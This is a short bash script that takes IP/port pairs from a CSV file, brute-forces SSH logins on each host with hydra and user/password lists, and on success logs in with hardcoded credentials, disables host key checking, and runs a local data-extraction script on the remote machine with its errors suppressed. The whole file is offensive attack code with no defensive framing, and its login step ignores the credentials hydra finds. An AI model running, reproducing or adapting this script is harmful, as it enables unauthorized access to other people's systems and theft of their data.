#!/bin/bash

# Read IP and port from previous script
devices=$(cat devices.csv)

# Loop through devices and try to connect to open port 22
for device in $devices; do
  ip=$(echo $device | cut -d',' -f1)
  port=$(echo $device | cut -d',' -f2)
  
  # Try to connect to open port 22 using user/pass file for brute force
  hydra -L users.txt -P passwords.txt ssh://$ip:$port
  
  # If connection is successful, run script file on device
  if [ $? -eq 0 ]; then
    sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@$ip 'bash -s' < ExtractSystemData.sh 2> /dev/null
  fi
done
